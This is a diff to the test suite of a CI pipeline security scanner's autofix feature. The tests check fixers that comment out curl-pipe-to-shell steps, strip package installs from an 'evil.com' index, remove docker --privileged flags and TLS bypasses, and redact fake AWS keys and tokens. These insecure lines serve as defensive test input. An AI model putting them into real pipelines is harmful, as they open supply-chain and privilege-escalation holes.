@@ -62,6 +62,64 @@ def test_available_fixers_includes_gha004():
     assert "GHA-004" in autofix.available_fixers()
 
 
+class TestGHA037PersistCredentials:
+    """GHA-037 reuses the GHA-002 checkout fixer: adding
+    ``persist-credentials: false`` is its canonical fix."""
+
+    _WF = (
+        "on: push\n"
+        "jobs:\n"
+        "  b:\n"
+        "    runs-on: ubuntu-latest\n"
+        "    steps:\n"
+        "      - uses: actions/checkout@v4\n"
+        "      - run: ./build.sh\n"
+    )
+
+    def test_registered_as_a_safe_fixer(self):
+        assert "GHA-037" in autofix.available_fixers()
+        assert autofix.fixer_safety("GHA-037") == autofix.SAFE
+
+    def test_adds_persist_credentials_false_to_checkout(self):
+        after = autofix.generate_fix(_finding("GHA-037"), self._WF)
+        assert after is not None
+        assert "persist-credentials: false" in after
+        # The flag lands under a with: block on the checkout step.
+        assert "with:" in after
+
+    def test_idempotent_when_flag_present(self):
+        wf = (
+            "on: push\n"
+            "jobs:\n"
+            "  b:\n"
+            "    runs-on: ubuntu-latest\n"
+            "    steps:\n"
+            "      - uses: actions/checkout@v4\n"
+            "        with:\n"
+            "          persist-credentials: false\n"
+        )
+        assert autofix.generate_fix(_finding("GHA-037"), wf) is None
+
+    def test_gha054_ssh_key_shares_the_same_fix(self):
+        # GHA-054 (checkout ssh-key persisted into .git/config) is resolved
+        # by the same persist-credentials: false edit.
+        wf = (
+            "on: push\n"
+            "jobs:\n"
+            "  b:\n"
+            "    runs-on: ubuntu-latest\n"
+            "    steps:\n"
+            "      - uses: actions/checkout@v4\n"
+            "        with:\n"
+            "          ssh-key: ${{ secrets.DEPLOY_KEY }}\n"
+        )
+        assert "GHA-054" in autofix.available_fixers()
+        assert autofix.fixer_safety("GHA-054") == autofix.SAFE
+        after = autofix.generate_fix(_finding("GHA-054"), wf)
+        assert after is not None
+        assert "persist-credentials: false" in after
+
+
 # ── Timeout fixers ─────────────────────────────────────────────────────
 
 
@@ -153,32 +211,74 @@ class TestCurlPipeCommentOut:
         jf = '        sh "curl https://example.com | bash"\n'
         assert autofix.generate_fix(_finding("JF-016"), jf) is not None
 
+    def test_cross_provider_drone(self):
+        dr = "      - curl https://example.com/i.sh | sh\n"
+        after = autofix.generate_fix(_finding("DR-014"), dr)
+        assert after is not None and "TODO(pipeline-check)" in after
+        assert autofix.fixer_safety("DR-014") == autofix.SAFE
+
+    def test_cross_provider_harness(self):
+        hn = "                    command: curl https://example.com/i.sh | bash\n"
+        after = autofix.generate_fix(_finding("HARNESS-005"), hn)
+        assert after is not None and "TODO(pipeline-check)" in after
+        assert autofix.fixer_safety("HARNESS-005") == autofix.SAFE
+
+
+class TestGHA031DeprecatedCommandMigration:
+    def test_registered_as_safe(self):
+        assert "GHA-031" in autofix.available_fixers()
+        assert autofix.fixer_safety("GHA-031") == autofix.SAFE
+
+    def test_set_output_migrates_to_github_output(self):
+        wf = '      - run: echo "::set-output name=tag::$VERSION"\n'
+        after = autofix.generate_fix(_finding("GHA-031"), wf)
+        assert after is not None
+        assert after == '      - run: echo "tag=$VERSION" >> "$GITHUB_OUTPUT"\n'
+
+    def test_save_state_migrates_to_github_state(self):
+        wf = "      - run: echo '::save-state name=st::abc'\n"
+        after = autofix.generate_fix(_finding("GHA-031"), wf)
+        assert after is not None
+        assert 'echo "st=abc" >> "$GITHUB_STATE"' in after
+
+    def test_idempotent_after_migration(self):
+        wf = '      - run: echo "tag=$VERSION" >> "$GITHUB_OUTPUT"\n'
+        assert autofix.generate_fix(_finding("GHA-031"), wf) is None
+
 
 # ── Docker flag removal ────────────────────────────────────────────────
 
 
 class TestDockerFlagRemoval:
+    # These fixers are registered ``unsafe`` (whole-file flag strip can
+    # touch unrelated commands), so they only run under tier="unsafe".
     def test_strips_privileged(self):
         wf = "  - run: docker run --privileged ubuntu:latest cmd\n"
-        after = autofix.generate_fix(_finding("GHA-017"), wf)
+        after = autofix.generate_fix(_finding("GHA-017"), wf, tier="unsafe")
         assert after is not None
         assert "--privileged" not in after
         assert "docker run" in after
 
+    def test_not_applied_under_safe_tier(self):
+        wf = "  - run: docker run --privileged ubuntu:latest cmd\n"
+        assert autofix.generate_fix(_finding("GHA-017"), wf) is None
+
     def test_strips_host_mount(self):
         wf = "  - run: docker run -v /host:/mnt ubuntu:latest cmd\n"
-        after = autofix.generate_fix(_finding("GHA-017"), wf)
+        after = autofix.generate_fix(_finding("GHA-017"), wf, tier="unsafe")
         assert after is not None
         assert "-v /host:/mnt" not in after
 
     def test_idempotent(self):
         wf = "  - run: docker run --privileged ubuntu:latest\n"
-        after = autofix.generate_fix(_finding("GHA-017"), wf)
-        assert autofix.generate_fix(_finding("GHA-017"), after) is None
+        after = autofix.generate_fix(_finding("GHA-017"), wf, tier="unsafe")
+        assert autofix.generate_fix(
+            _finding("GHA-017"), after, tier="unsafe",
+        ) is None
 
     def test_cross_provider_gl(self):
         gl = "    - docker run --net=host myimage\n"
-        after = autofix.generate_fix(_finding("GL-017"), gl)
+        after = autofix.generate_fix(_finding("GL-017"), gl, tier="unsafe")
         assert after is not None
         assert "--net=host" not in after
 
@@ -187,29 +287,37 @@ class TestDockerFlagRemoval:
 
 
 class TestPkgFlagRemoval:
+    # Registered ``unsafe`` (whole-file strip), so only runs under
+    # tier="unsafe".
     def test_strips_insecure_index_url(self):
         wf = "  - run: pip install --index-url http://evil.com/simple/ requests\n"
-        after = autofix.generate_fix(_finding("GHA-018"), wf)
+        after = autofix.generate_fix(_finding("GHA-018"), wf, tier="unsafe")
         assert after is not None
         assert "--index-url" not in after
         assert "pip install" in after
 
+    def test_not_applied_under_safe_tier(self):
+        wf = "  - run: pip install --trusted-host evil.com pkg\n"
+        assert autofix.generate_fix(_finding("GHA-018"), wf) is None
+
     def test_strips_trusted_host(self):
         wf = "  - run: pip install --trusted-host evil.com pkg\n"
-        after = autofix.generate_fix(_finding("GHA-018"), wf)
+        after = autofix.generate_fix(_finding("GHA-018"), wf, tier="unsafe")
         assert after is not None
         assert "--trusted-host" not in after
 
     def test_strips_npm_insecure_registry(self):
         wf = "  - run: npm install --registry=http://evil.com pkg\n"
-        after = autofix.generate_fix(_finding("BB-014"), wf)
+        after = autofix.generate_fix(_finding("BB-014"), wf, tier="unsafe")
         assert after is not None
         assert "--registry" not in after
 
     def test_idempotent(self):
         wf = "  - run: pip install --trusted-host evil.com pkg\n"
-        after = autofix.generate_fix(_finding("GHA-018"), wf)
-        assert autofix.generate_fix(_finding("GHA-018"), after) is None
+        after = autofix.generate_fix(_finding("GHA-018"), wf, tier="unsafe")
+        assert autofix.generate_fix(
+            _finding("GHA-018"), after, tier="unsafe",
+        ) is None
 
 
 # ── Jenkins Groovy secret redaction ────────────────────────────────────
@@ -217,18 +325,18 @@ class TestPkgFlagRemoval:
 
 class TestJF008SecretRedaction:
     def test_redacts_aws_key(self):
-        jf = '  AWS_KEY = "AKIAIOSFODNN7EXAMPLE"\n'
+        jf = '  AWS_KEY = "AKIAZ3MHALF2TESTHIJK"\n'
         after = autofix.generate_fix(_finding("JF-008", "Jenkinsfile"), jf)
         assert after is not None
         assert "<REDACTED>" in after
-        assert "AKIAIOSFODNN7EXAMPLE" not in after
+        assert "AKIAZ3MHALF2TESTHIJK" not in after
 
     def test_preserves_non_secret(self):
         jf = '  SAFE = "hello"\n'
         assert autofix.generate_fix(_finding("JF-008", "Jenkinsfile"), jf) is None
 
     def test_idempotent(self):
-        jf = '  AWS_KEY = "AKIAIOSFODNN7EXAMPLE"\n'
+        jf = '  AWS_KEY = "AKIAZ3MHALF2TESTHIJK"\n'
         after = autofix.generate_fix(_finding("JF-008", "Jenkinsfile"), jf)
         assert autofix.generate_fix(_finding("JF-008", "Jenkinsfile"), after) is None
 
@@ -344,7 +452,7 @@ class TestGHA014DeployEnvStub:
 
 class TestK8sDropTrueLine:
     """K8S-002 / K8S-003 / K8S-004 / K8S-005 all drop a YAML key set to
-    ``true``. Parameterised over the four rule IDs since the logic is
+    ``true``. Parameterized over the four rule IDs since the logic is
     identical."""
 
     def test_k8s005_drops_privileged_true(self):
@@ -590,6 +698,28 @@ class TestGCB011TLSBypass:
         after = autofix.generate_fix(_finding("GCB-011"), cb)
         assert after is not None
         assert "TODO(pipeline-check): remove TLS/SSL verification bypass" in after
+
+
+class TestDroneHarnessTLSBypass:
+    # DR-006 / HARNESS-006 detect TLS bypass through the same
+    # _primitives.tls_bypass detector as every other provider, so they
+    # share _comment_tls_bypass (the analog of DR-014 / HARNESS-005 already
+    # sharing the curl-pipe fixer).
+    def test_dr006_comments_out_tls_bypass(self):
+        dr = "      - curl --insecure https://example.com/x.sh -o x.sh\n"
+        after = autofix.generate_fix(_finding("DR-006"), dr)
+        assert after is not None
+        assert "TODO(pipeline-check): remove TLS/SSL verification bypass" in after
+        assert autofix.fixer_safety("DR-006") == autofix.SAFE
+        # idempotent: the commented line isn't re-flagged
+        assert autofix.generate_fix(_finding("DR-006"), after) is None
+
+    def test_harness006_comments_out_tls_bypass(self):
+        hn = "                      npm config set strict-ssl false\n"
+        after = autofix.generate_fix(_finding("HARNESS-006"), hn)
+        assert after is not None
+        assert "TODO(pipeline-check): remove TLS/SSL verification bypass" in after
+        assert autofix.fixer_safety("HARNESS-006") == autofix.SAFE
 
 
 # ── Dockerfile comment-only TODO fixers ───────────────────────────────
@@ -874,7 +1004,7 @@ class TestGHA034SecretsInheritTODO:
             "    uses: octo/repo/.github/workflows/build.yml@v2\n"
             "    secrets: inherit\n"
         )
-        after = autofix.generate_fix(_finding("GHA-034"), wf)
+        after = autofix.generate_fix(_finding("GHA-034"), wf, tier="unsafe")
         assert after is not None
         assert "TODO(pipeline-check GHA-034)" in after
 
@@ -886,7 +1016,7 @@ class TestGHA034SecretsInheritTODO:
             "    secrets:\n"
             "      NPM_TOKEN: ${{ secrets.NPM_TOKEN }}\n"
         )
-        assert autofix.generate_fix(_finding("GHA-034"), wf) is None
+        assert autofix.generate_fix(_finding("GHA-034"), wf, tier="unsafe") is None
 
     def test_idempotent(self):
         wf = (
@@ -895,9 +1025,9 @@ class TestGHA034SecretsInheritTODO:
             "    uses: octo/repo/.github/workflows/build.yml@v2\n"
             "    secrets: inherit\n"
         )
-        once = autofix.generate_fix(_finding("GHA-034"), wf)
+        once = autofix.generate_fix(_finding("GHA-034"), wf, tier="unsafe")
         assert once is not None
-        assert autofix.generate_fix(_finding("GHA-034"), once) is None
+        assert autofix.generate_fix(_finding("GHA-034"), once, tier="unsafe") is None
 
 
 class TestGCB022SubstitutionOptionLooseDrop:
@@ -1380,11 +1510,11 @@ class TestBuildkiteFixers:
             "steps:\n"
             "  - command: echo hi\n"
             "    env:\n"
-            "      AWS_KEY: AKIAIOSFODNN7EXAMPLE\n"
+            "      AWS_KEY: AKIAZ3MHALF2TESTHIJK\n"
         )
         after = autofix.generate_fix(_finding("BK-002"), wf)
         assert after is not None
-        assert "AKIAIOSFODNN7EXAMPLE" not in after
+        assert "AKIAZ3MHALF2TESTHIJK" not in after
         assert "<REDACTED>" in after
         assert "TODO(pipeline-check)" in after
 
@@ -1396,7 +1526,7 @@ class TestBuildkiteFixers:
 
     def test_bk005_strips_privileged(self):
         wf = "  - command: docker run --privileged ubuntu:latest cmd\n"
-        after = autofix.generate_fix(_finding("BK-005"), wf)
+        after = autofix.generate_fix(_finding("BK-005"), wf, tier="unsafe")
         assert after is not None
         assert "--privileged" not in after
         assert "docker run" in after
@@ -1470,11 +1600,11 @@ class TestArgoFixers:
             "      container:\n"
             "        env:\n"
             "          - name: API_KEY\n"
-            "            value: AKIAIOSFODNN7EXAMPLE\n"
+            "            value: AKIAZ3MHALF2TESTHIJK\n"
         )
         after = autofix.generate_fix(_finding("ARGO-006"), manifest)
         assert after is not None
-        assert "AKIAIOSFODNN7EXAMPLE" not in after
+        assert "AKIAZ3MHALF2TESTHIJK" not in after
         assert "<REDACTED>" in after
 
     def test_argo008_handles_curl_pipe(self):
@@ -1516,6 +1646,42 @@ class TestArgoFixers:
         assert autofix.generate_fix(_finding("ARGO-008"), manifest) is None
 
 
+class TestCloudBuildHarnessSecretRedaction:
+    # GCB-012 (a literal in ``substitutions:``) and HARNESS-004 (a literal
+    # ``variables:`` value) detect purely by value shape, so they share the
+    # ``_fix_gha008`` redactor like the rest of the literal-secret family.
+    def test_gcb012_redacts_substitution_literal(self):
+        cb = (
+            "substitutions:\n"
+            "  _GH_TOKEN: ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n"
+            "steps:\n"
+            "  - name: gcr.io/cloud-builders/gcloud\n"
+            "    args: [echo]\n"
+        )
+        after = autofix.generate_fix(_finding("GCB-012"), cb)
+        assert after is not None
+        assert "ghp_aaaaaaaa" not in after
+        assert "<REDACTED>" in after
+        assert autofix.fixer_safety("GCB-012") == autofix.SAFE
+        # idempotent: the redacted placeholder isn't re-flagged
+        assert autofix.generate_fix(_finding("GCB-012"), after) is None
+
+    def test_harness004_redacts_variable_literal(self):
+        hn = (
+            "pipeline:\n"
+            "  identifier: build\n"
+            "  variables:\n"
+            "    - name: GH_TOKEN\n"
+            "      type: String\n"
+            "      value: ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n"
+        )
+        after = autofix.generate_fix(_finding("HARNESS-004"), hn)
+        assert after is not None
+        assert "ghp_aaaaaaaa" not in after
+        assert "<REDACTED>" in after
+        assert autofix.fixer_safety("HARNESS-004") == autofix.SAFE
+
+
 # ── Roundtrip safety net ──────────────────────────────────────────────
 
 
@@ -1525,7 +1691,7 @@ class TestRoundtripSafety:
     def test_bails_when_after_does_not_parse(self, monkeypatch):
         from pipeline_check.core import autofix as af
 
-        @af.register("ZZ-PARSE-BREAK")
+        @af.register("ZZ-PARSE-BREAK", safety="safe")
         def _break(content, finding):
             return "key: : invalid\n  - lol\n"  # not valid YAML
 
@@ -1537,7 +1703,7 @@ class TestRoundtripSafety:
     def test_bails_when_top_level_type_changes(self):
         from pipeline_check.core import autofix as af
 
-        @af.register("ZZ-TYPE-SWAP")
+        @af.register("ZZ-TYPE-SWAP", safety="safe")
         def _swap(content, finding):
             return "- a\n- b\n"  # list, was a mapping
 
@@ -1548,7 +1714,7 @@ class TestRoundtripSafety:
     def test_bails_when_multidoc_count_changes(self):
         from pipeline_check.core import autofix as af
 
-        @af.register("ZZ-DOC-DROP")
+        @af.register("ZZ-DOC-DROP", safety="safe")
         def _drop(content, finding):
             # Strip the second document from a two-doc stream.
             return content.split("---", 1)[0]
@@ -1569,3 +1735,368 @@ class TestRoundtripSafety:
         after = autofix.generate_fix(_finding("DF-001"), df)
         assert after is not None
         assert "TODO(pipeline-check DF-001)" in after
+
+
+# ── Known correctness gaps (currently failing) ────────────────────────
+#
+# Each class below pins a specific autofix bug surfaced during the
+# 2026-05 quality review. Tests are XFAIL until the fixer is repaired
+# so the failure mode is recorded in the suite, not lost in a notepad.
+
+
+class TestGHA015SkipsReusableWorkflowJobs:
+    """GHA-015 fixer must not add ``timeout-minutes`` to reusable-workflow
+    calls. The GitHub Actions schema rejects ``timeout-minutes`` on a job
+    whose body is a ``uses:`` invocation; the called workflow's own jobs
+    declare their own timeouts. The rule itself already skips these
+    jobs, the fixer should match."""
+
+    def test_uses_only_job_is_left_alone(self):
+        wf = (
+            "jobs:\n"
+            "  call:\n"
+            "    uses: ./.github/workflows/deploy.yml\n"
+        )
+        after = autofix.generate_fix(_finding("GHA-015"), wf)
+        # The only job is a reusable-workflow call, so there is nothing
+        # for the fixer to do.
+        assert after is None, (
+            "fixer inserted timeout-minutes into a uses: job, which "
+            "GitHub Actions rejects at runtime"
+        )
+
+    def test_mixed_file_leaves_uses_job_alone(self):
+        wf = (
+            "jobs:\n"
+            "  build:\n"
+            "    runs-on: ubuntu-latest\n"
+            "    steps:\n"
+            "      - run: echo hi\n"
+            "  call:\n"
+            "    uses: ./.github/workflows/deploy.yml\n"
+        )
+        after = autofix.generate_fix(_finding("GHA-015"), wf)
+        assert after is not None
+        # The normal job picks up a timeout, the reusable-workflow call
+        # does not.
+        assert "build:\n    timeout-minutes: 30" in after
+        assert "call:\n    timeout-minutes" not in after
+
+
+class TestNpmCiPreservesGlobalInstall:
+    """``_fix_npm_ci`` must not rewrite ``npm install --global <pkg>`` to
+    ``npm ci --global <pkg>``. ``npm ci`` rejects package arguments, so
+    the rewrite breaks the step. The GHA-021 rule already exempts
+    ``-g``/``--global`` from its match, the fixer should too."""
+
+    def test_global_install_is_left_alone(self):
+        wf = (
+            "jobs:\n"
+            "  build:\n"
+            "    runs-on: ubuntu-latest\n"
+            "    steps:\n"
+            "      - run: npm install --global typescript\n"
+        )
+        after = autofix.generate_fix(_finding("GHA-021"), wf)
+        # No bare ``npm install`` in the file, only a -g install that
+        # the rule itself would not have flagged. The fixer has
+        # nothing to do.
+        assert after is None, (
+            "fixer rewrote ``npm install --global`` to ``npm ci "
+            "--global``, which npm rejects"
+        )
+
+    def test_short_g_install_is_left_alone(self):
+        wf = "  - run: npm install -g typescript\n"
+        after = autofix.generate_fix(_finding("GHA-021"), wf)
+        assert after is None
+
+    def test_bare_npm_install_is_rewritten(self):
+        wf = "  - run: npm install\n"
+        after = autofix.generate_fix(_finding("GHA-021"), wf)
+        assert after is not None
+        assert "npm ci" in after
+        assert "npm install" not in after
+
+    def test_npm_install_chained_with_shell_separator_is_rewritten(self):
+        wf = "  - run: npm install && npm test\n"
+        after = autofix.generate_fix(_finding("GHA-021"), wf)
+        assert after is not None
+        assert "npm ci && npm test" in after
+
+    def test_npm_install_with_trailing_comment_is_rewritten(self):
+        wf = "  - run: npm install  # bootstrap deps\n"
+        after = autofix.generate_fix(_finding("GHA-021"), wf)
+        assert after is not None
+        assert "npm ci" in after
+
+
+class TestDockerFlagRemovalPreservesIndent:
+    """``_strip_docker_flags`` collapses runs of 2+ spaces anywhere on
+    the line, including the YAML leading indent. The current
+    implementation rewrites ``        - run: docker run --privileged x``
+    to ``  - run: docker run x`` (or further), which breaks the step
+    mapping; the safety net then bails and the user gets no patch."""
+
+    def test_preserves_eight_space_indent(self):
+        wf = (
+            "jobs:\n"
+            "  build:\n"
+            "    runs-on: ubuntu-latest\n"
+            "    steps:\n"
+            "      - name: launch\n"
+            "        run: docker run --privileged ubuntu:latest cmd\n"
+        )
+        after = autofix.generate_fix(_finding("GHA-017"), wf, tier="unsafe")
+        assert after is not None, (
+            "fixer produced no patch, likely because collapsed indent "
+            "tripped the YAML safety net"
+        )
+        assert "--privileged" not in after
+        # The ``docker run`` line keeps its 8-space indent. A bare
+        # substring check catches both the correct shape and any
+        # variant that leaves the prefix intact.
+        assert "        run: docker run" in after, (
+            "fixer mangled the leading indent on the ``run:`` line"
+        )
+
+
+class TestGHA003EnvBlockIndent:
+    """``_fix_gha003`` emits an ``env:`` block at the column where the
+    run command starts, not the column where the ``run:`` key lives.
+    For the common ``  - run: <cmd>`` shape that puts ``env:`` deeper
+    than its parent step mapping, producing invalid YAML; the safety
+    net bails and the user gets no patch."""
+
+    def test_list_item_run_produces_valid_env_block(self):
+        wf = (
+            "jobs:\n"
+            "  build:\n"
+            "    runs-on: ubuntu-latest\n"
+            "    steps:\n"
+            '      - run: echo "${{ github.event.pull_request.title }}"\n'
+        )
+        after = autofix.generate_fix(_finding("GHA-003"), wf, tier="unsafe")
+        assert after is not None, (
+            "fixer produced no patch, likely because the ``env:`` block "
+            "was over-indented and tripped the YAML safety net"
+        )
+        # ``env:`` must sit at the same column as ``run:``, which is 8
+        # (two for ``jobs:`` indent, two for ``build:``, two for
+        # ``steps:`` list, then the ``- `` list marker plus key).
+        assert "        env:" in after
+        # And it must NOT sit at the deeper column the current
+        # implementation chooses (column of the command start).
+        assert "              env:" not in after
+
+
+# ── Azure timeout fixer (ADO-015) ─────────────────────────────────────
+
+
+class TestADO015TimeoutMultiJob:
+    def test_inserts_timeout_in_job_missing_it(self):
+        pipeline = (
+            "trigger:\n"
+            "  - main\n"
+            "jobs:\n"
+            "  - job: Build\n"
+            "    pool:\n"
+            "      vmImage: ubuntu-latest\n"
+            "    steps:\n"
+            "      - script: echo hi\n"
+        )
+        after = autofix.generate_fix(_finding("ADO-015"), pipeline)
+        assert after is not None
+        assert "timeoutInMinutes: 30" in after
+
+    def test_skips_job_that_already_has_timeout(self):
+        pipeline = (
+            "jobs:\n"
+            "  - job: Build\n"
+            "    timeoutInMinutes: 60\n"
+            "    steps:\n"
+            "      - script: echo hi\n"
+        )
+        assert autofix.generate_fix(_finding("ADO-015"), pipeline) is None
+
+    def test_inserts_only_in_missing_jobs(self):
+        pipeline = (
+            "jobs:\n"
+            "  - job: Build\n"
+            "    timeoutInMinutes: 60\n"
+            "    steps:\n"
+            "      - script: echo build\n"
+            "  - job: Test\n"
+            "    pool:\n"
+            "      vmImage: ubuntu-latest\n"
+            "    steps:\n"
+            "      - script: echo test\n"
+        )
+        after = autofix.generate_fix(_finding("ADO-015"), pipeline)
+        assert after is not None
+        assert after.count("timeoutInMinutes") == 2
+
+
+# ── Jenkins build discarder (JF-011) ─────────────────────────────────
+
+
+class TestJF011BuildDiscarder:
+    def test_inserts_into_existing_options_block(self):
+        jenkinsfile = (
+            "pipeline {\n"
+            "    agent any\n"
+            "    options {\n"
+            "        timestamps()\n"
+            "    }\n"
+            "    stages {\n"
+            "        stage('Build') {\n"
+            "            steps { echo 'hi' }\n"
+            "        }\n"
+            "    }\n"
+            "}\n"
+        )
+        after = autofix.generate_fix(
+            _finding("JF-011", resource="Jenkinsfile"), jenkinsfile,
+        )
+        assert after is not None
+        assert "buildDiscarder(logRotator(numToKeepStr: '30'))" in after
+        assert "timestamps()" in after
+
+    def test_creates_options_block_after_agent(self):
+        jenkinsfile = (
+            "pipeline {\n"
+            "    agent any\n"
+            "    stages {\n"
+            "        stage('Build') {\n"
+            "            steps { echo 'hi' }\n"
+            "        }\n"
+            "    }\n"
+            "}\n"
+        )
+        after = autofix.generate_fix(
+            _finding("JF-011", resource="Jenkinsfile"), jenkinsfile,
+        )
+        assert after is not None
+        assert "options {" in after
+        assert "buildDiscarder" in after
+
+    def test_idempotent_when_discarder_exists(self):
+        jenkinsfile = (
+            "pipeline {\n"
+            "    agent any\n"
+            "    options {\n"
+            "        buildDiscarder(logRotator(numToKeepStr: '10'))\n"
+            "    }\n"
+            "}\n"
+        )
+        assert autofix.generate_fix(
+            _finding("JF-011", resource="Jenkinsfile"), jenkinsfile,
+        ) is None
+
+    def test_returns_none_for_scripted_pipeline(self):
+        jenkinsfile = (
+            "node {\n"
+            "    stage('Build') {\n"
+            "        sh 'make'\n"
+            "    }\n"
+            "}\n"
+        )
+        assert autofix.generate_fix(
+            _finding("JF-011", resource="Jenkinsfile"), jenkinsfile,
+        ) is None
+
+    def test_handles_agent_block_form(self):
+        jenkinsfile = (
+            "pipeline {\n"
+            "    agent {\n"
+            "        docker { image 'node:18' }\n"
+            "    }\n"
+            "    stages {\n"
+            "        stage('Build') {\n"
+            "            steps { echo 'hi' }\n"
+            "        }\n"
+            "    }\n"
+            "}\n"
+        )
+        after = autofix.generate_fix(
+            _finding("JF-011", resource="Jenkinsfile"), jenkinsfile,
+        )
+        assert after is not None
+        assert "options {" in after
+        assert "buildDiscarder" in after
+
+
+# ── GitLab image pinning TODO (GL-001) ────────────────────────────────
+
+
+class TestGL001ImagePinning:
+    def test_adds_todo_to_unpinned_image(self):
+        ci = (
+            "build:\n"
+            "  image: node:18\n"
+            "  script:\n"
+            "    - npm test\n"
+        )
+        after = autofix.generate_fix(_finding("GL-001"), ci)
+        assert after is not None
+        assert "TODO(pipeline-check): pin to digest" in after
+
+    def test_skips_digest_pinned_image(self):
+        ci = (
+            "build:\n"
+            "  image: node@sha256:abcdef1234567890\n"
+            "  script:\n"
+            "    - npm test\n"
+        )
+        assert autofix.generate_fix(_finding("GL-001"), ci) is None
+
+
+# ── Bitbucket pipe pinning TODO (BB-001) ──────────────────────────────
+
+
+class TestBB001PipePinning:
+    def test_adds_todo_to_unpinned_pipe(self):
+        pipeline = (
+            "pipelines:\n"
+            "  default:\n"
+            "    - step:\n"
+            "        script:\n"
+            "          - echo hi\n"
+            "        - pipe: atlassian/aws-s3-deploy:1.0.0\n"
+        )
+        after = autofix.generate_fix(_finding("BB-001"), pipeline)
+        assert after is not None
+        assert "TODO(pipeline-check): pin to commit SHA" in after
+
+    def test_idempotent_when_todo_exists(self):
+        pipeline = (
+            "pipelines:\n"
+            "  default:\n"
+            "    - step:\n"
+            "        - pipe: atlassian/foo:1.0  # TODO(pipeline-check): pin to commit SHA\n"
+        )
+        after = autofix.generate_fix(_finding("BB-001"), pipeline)
+        assert after is None
+
+
+# ── Azure task pinning TODO (ADO-001) ─────────────────────────────────
+
+
+class TestADO001TaskPinning:
+    def test_adds_todo_to_unpinned_task(self):
+        pipeline = (
+            "steps:\n"
+            "  - task: DotNetCoreCLI@2\n"
+            "    inputs:\n"
+            "      command: build\n"
+        )
+        after = autofix.generate_fix(_finding("ADO-001"), pipeline)
+        assert after is not None
+        assert "TODO(pipeline-check): pin to commit SHA" in after
+
+    def test_idempotent_when_todo_exists(self):
+        pipeline = (
+            "steps:\n"
+            "  - task: DotNetCoreCLI@2  # TODO(pipeline-check): pin to commit SHA\n"
+        )
+        assert autofix.generate_fix(_finding("ADO-001"), pipeline) is None
